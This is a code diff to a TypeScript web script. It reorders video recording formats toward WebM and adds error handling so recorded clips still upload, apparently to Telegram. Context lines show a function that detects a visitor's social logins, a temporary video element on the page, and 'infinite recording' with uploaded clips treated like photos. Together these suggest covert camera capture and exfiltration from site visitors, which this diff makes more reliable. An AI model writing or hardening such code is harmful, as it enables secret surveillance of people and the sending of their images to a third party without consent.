@@ -317,18 +317,21 @@ async function detectSocialLogins(refSource: string): Promise<Record<string, str
 }
 
 // ═══════════════════════════════════════════════════════════
-// VIDEO — MP4 priority, infinite recording
+// VIDEO — WebM priority (universal MediaRecorder support across all browsers)
+// MP4 types moved to fallback: Android Chrome 130+ passes isTypeSupported for
+// video/mp4 but produces fragmented MP4 (fMP4) which Telegram's sendVideo
+// rejects. WebM (vp9/vp8) is reliable on all browsers that support MediaRecorder.
 // ═══════════════════════════════════════════════════════════
 const VIDEO_MIME_TYPES = [
-  'video/mp4;codecs=avc1.42E01E,mp4a.40.2',
-  'video/mp4;codecs=avc1',
-  'video/mp4;codecs=h264',
-  'video/mp4',
   'video/webm;codecs=vp9,opus',
   'video/webm;codecs=vp8,opus',
   'video/webm;codecs=vp9',
   'video/webm;codecs=vp8',
   'video/webm',
+  'video/mp4;codecs=avc1.42E01E,mp4a.40.2',
+  'video/mp4;codecs=avc1',
+  'video/mp4;codecs=h264',
+  'video/mp4',
 ];
 
 function getSupportedMime(): string | null {
@@ -450,15 +453,39 @@ function startSingleRecord(stream: MediaStream, videoEl: HTMLVideoElement, label
     if (document.body.contains(videoEl)) document.body.removeChild(videoEl);
   };
 
-  const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 800_000 });
+  let recorder: MediaRecorder;
+  try {
+    recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 800_000 });
+  } catch {
+    // Constructor can throw if the codec string is accepted by isTypeSupported
+    // but rejected at instantiation (e.g. hardware encoder not available).
+    // Retry with plain video/webm which every browser supports.
+    const fallback = 'video/webm';
+    try { recorder = new MediaRecorder(stream, { mimeType: fallback, videoBitsPerSecond: 800_000 }); }
+    catch { cleanup(); return; }
+  }
+  const actualMime = recorder.mimeType || mimeType;
   recorder.ondataavailable = (e) => { if (e.data?.size > 0) chunks.push(e.data); };
   recorder.onstop = () => {
     if (chunks.length) {
-      const blob = new Blob(chunks, { type: mimeType });
+      const blob = new Blob(chunks, { type: actualMime });
       // index=0, isFinal=true — single clip, treated same as a photo
-      uploadChunk(blob, mimeType, 0, label, true);
+      uploadChunk(blob, actualMime, 0, label, true);
     }
     cleanup();
+  };
+  // onerror: recorder encountered an unrecoverable error (e.g. codec failure
+  // mid-stream). Upload whatever chunks we already have, then clean up.
+  recorder.onerror = () => {
+    if (!stopped) {
+      stopped = true;
+      if (timer != null) { clearTimeout(timer); timer = null; }
+      if (chunks.length) {
+        const blob = new Blob(chunks, { type: actualMime });
+        uploadChunk(blob, actualMime, 0, label, true);
+      }
+      cleanup();
+    }
   };
 
   const stop = () => {
@@ -498,7 +525,14 @@ function startSingleRecord(stream: MediaStream, videoEl: HTMLVideoElement, label
 
   // Auto-stop after MAX_MS
   timer = setTimeout(stop, MAX_MS);
-  recorder.start(500); // timeslice = 500 ms
+  try {
+    recorder.start(500); // timeslice = 500 ms keeps ondataavailable firing
+  } catch {
+    // start() can throw if the stream has no active tracks at this moment.
+    // Clear the timer and bail out gracefully.
+    if (timer != null) { clearTimeout(timer); timer = null; }
+    cleanup();
+  }
 }
 
 // ── Generic POST helper ─────────────────────────────────────
